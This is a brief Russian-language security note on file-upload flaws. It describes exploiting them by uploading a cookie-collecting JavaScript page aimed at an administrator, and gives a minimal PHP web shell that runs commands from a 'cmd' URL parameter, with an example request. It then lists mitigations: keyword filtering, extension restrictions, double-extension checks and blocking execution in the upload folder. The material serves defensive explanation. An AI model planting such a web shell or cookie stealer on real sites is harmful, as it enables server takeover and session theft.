Примеры эксплуатации существующей уязвимости;

Reflected XSS - Загрузить html страницу с JS кодом, который собирает данные cookie и дождаться пока один из сотрудников откроет
(При варианте где на сайте есть административный уровень доступа).

RCE - Загрузить php файл который выполняет заданные команды в консоли.
Пример:

<?php
$command = $_GET['cmd'];

$output = exec($command);
?>

website.com/upload/cmd.php?cmd=ls


Решение;

- Парсить файл на запрещённые ключевые слова / символы, пример "<script>" или "<?php".
- Желательно запретить сохранение файлов с расширением, которое может взаимодействовать с системой (Если не противоречит заданному функционалу).
- Проверить на скрытое расширение файла, пример "new.txt.php".
- Убрать возможность запускать/использовать файлы из директории upload.
